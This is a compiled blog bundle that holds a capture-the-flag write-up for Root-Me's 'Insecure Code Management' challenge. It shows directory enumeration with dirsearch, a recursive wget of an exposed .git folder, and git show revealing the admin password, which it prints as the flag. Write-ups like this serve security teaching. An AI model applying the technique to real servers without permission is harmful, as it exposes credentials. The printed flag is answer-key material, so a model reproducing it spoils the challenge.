"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[658],{39194(e,r,n){n.r(r),n.d(r,{assets:()=>h,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"root-me/web-server/insecure-code-management","title":"Insecure Code Management","description":"- Description: Get the password (in clear text) from the admin account.","source":"@site/docs/root-me/web-server/insecure-code-management.mdx","sourceDirName":"root-me/web-server","slug":"/root-me/web-server/insecure-code-management","permalink":"/docs/root-me/web-server/insecure-code-management","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Web","permalink":"/docs/tags/web","description":"Includes write-ups on the topic of Web"}],"version":"current","frontMatter":{"tags":["web"]},"sidebar":"writeupsSidebar","previous":{"title":"HTTP - Verb tampering","permalink":"/docs/root-me/web-server/http-verb-tampering/"},"next":{"title":"Install files","permalink":"/docs/root-me/web-server/install-files/"}}');var t=n(74848),i=n(28453);const o={tags:["web"]},c="Insecure Code Management",h={},a=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function l(e){const r={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(r.header,{children:(0,t.jsx)(r.h1,{id:"insecure-code-management",children:"Insecure Code Management"})}),"\n",(0,t.jsxs)(r.ul,{children:["\n",(0,t.jsxs)(r.li,{children:[(0,t.jsx)(r.strong,{children:"Description:"})," Get the password (in clear text) from the admin account."]}),"\n",(0,t.jsxs)(r.li,{children:[(0,t.jsx)(r.strong,{children:"Difficulty:"})," Easy"]}),"\n"]}),"\n",(0,t.jsx)(r.hr,{}),"\n",(0,t.jsx)(r.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,t.jsx)(r.p,{children:"When accessing the website, we are presented with a login page, but no credentials are provided."}),"\n",(0,t.jsxs)(r.p,{children:["Using ",(0,t.jsx)(r.code,{children:"dirsearch"})," to enumerate hidden paths, we discover several endpoints related to Git."]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"> dirsearch  -u http://challenge01.root-me.org/web-serveur/ch61/\r\n  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    \r\n (_||| _) (/_(_|| (_| )                                                                                             \r\n                                                                                                                    \r\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460\r\n\r\nOutput File: /home/kali/reports/http_challenge01.root-me.org/_web-serveur_ch61__26-02-21_05-28-00.txt\r\n\r\nTarget: http://challenge01.root-me.org/\r\n\r\n[05:28:00] Starting: web-serveur/ch61/                                                                              \r\n[05:28:05] 403 -  548B  - /web-serveur/ch61/%2e%2e;/test\r\n//highlight-next-line\r\n[05:28:10] 301 -  162B  - /web-serveur/ch61/.git  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/\r\n[05:28:10] 200 -  197B  - /web-serveur/ch61/.git/branches/                  \r\n[05:28:10] 200 -    1KB - /web-serveur/ch61/.git/\r\n[05:28:10] 200 -  352B  - /web-serveur/ch61/.git/COMMIT_EDITMSG\r\n[05:28:10] 200 -   92B  - /web-serveur/ch61/.git/config\r\n[05:28:10] 200 -   73B  - /web-serveur/ch61/.git/description\r\n[05:28:10] 200 -   23B  - /web-serveur/ch61/.git/HEAD                       \r\n[05:28:10] 200 -    1KB - /web-serveur/ch61/.git/hooks/                     \r\n[05:28:10] 200 -  523B  - /web-serveur/ch61/.git/index                      \r\n[05:28:10] 200 -  301B  - /web-serveur/ch61/.git/info/\r\n[05:28:10] 200 -  797B  - /web-serveur/ch61/.git/logs/HEAD                  \r\n[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/logs/refs  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/logs/refs/\r\n[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/logs/refs/heads  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/logs/refs/heads/\r\n[05:28:10] 200 -  797B  - /web-serveur/ch61/.git/logs/refs/heads/master\r\n[05:28:10] 200 -  240B  - /web-serveur/ch61/.git/info/exclude               \r\n[05:28:10] 200 -  408B  - /web-serveur/ch61/.git/logs/                      \r\n[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/refs/tags  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/refs/tags/\r\n[05:28:10] 200 -    3KB - /web-serveur/ch61/.git/objects/                   \r\n[05:28:10] 200 -  410B  - /web-serveur/ch61/.git/refs/                      \r\n[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/refs/heads  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/refs/heads/\r\n[05:28:10] 200 -   41B  - /web-serveur/ch61/.git/refs/heads/master\n"})}),"\n",(0,t.jsxs)(r.p,{children:["For projects using Git, running ",(0,t.jsx)(r.code,{children:"git init"})," or ",(0,t.jsx)(r.code,{children:"git clone"})," creates a ",(0,t.jsx)(r.code,{children:".git"})," directory, which stores all version control data of the project.\r\nSince this directory is publicly accessible, we can download it entirely."]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"wget -r http://challenge01.root-me.org/web-serveur/ch61/.git/\n"})}),"\n",(0,t.jsx)(r.p,{children:"After downloading, the directory structure looks like this:"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"> ls -a \r\n.  ..  branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  index.html  info  logs  objects  refs\n"})}),"\n",(0,t.jsxs)(r.p,{children:["By using ",(0,t.jsx)(r.code,{children:"git show"})," to inspect the most recent commit, we can see the code changes.\r\nThe old password revealed in this commit is the flag for the challenge."]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"> git show\r\ncommit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)\r\nAuthor: John <john@bs-corp.com>\r\nDate:   Fri Sep 27 20:10:05 2019 +0200\r\n\r\n    blue team want sha256!!!!!!!!!\r\n\r\ndiff --git a/config.php b/config.php\r\nindex e11aad2..663fe35 100644\r\n--- a/config.php\r\n+++ b/config.php\r\n@@ -1,3 +1,3 @@\r\n <?php\r\n        $username = \"admin\";\r\n//highlight-next-line\r\n-       $password = \"s3cureP@ssw0rd\";\r\n+       $password = \"0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c\";\r\ndiff --git a/index.php b/index.php\r\nindex f7237d0..2e620c1 100755\r\n--- a/index.php\r\n+++ b/index.php\r\n@@ -13,7 +13,7 @@\r\n                <?php\r\n                        include('./config.php');\r\n                        if(isset($_POST['username']) && isset($_POST['password'])){\r\n-                               if ($_POST['username'] == $username && md5($_POST['password']) == md5($password)){\r\n+                               if ($_POST['username'] == $username && hash('sha256', $_POST['password']) == $password){\r\n                                        echo \"<p id='left'>Welcome  \".htmlentities($_POST['username']).\"</p>\";\r\n                                        echo '<input type=\"submit\" value=\"LOG IN\" href=\"./index.php\" class=\"button\" />';\n"})}),"\n",(0,t.jsx)(r.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,t.jsxs)(r.blockquote,{children:["\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.code,{children:"s3cureP@ssw0rd"})}),"\n"]})]})}function d(e={}){const{wrapper:r}={...(0,i.R)(),...e.components};return r?(0,t.jsx)(r,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},28453(e,r,n){n.d(r,{R:()=>o,x:()=>c});var s=n(96540);const t={},i=s.createContext(t);function o(e){const r=s.useContext(i);return s.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),s.createElement(i.Provider,{value:r},e.children)}}}]);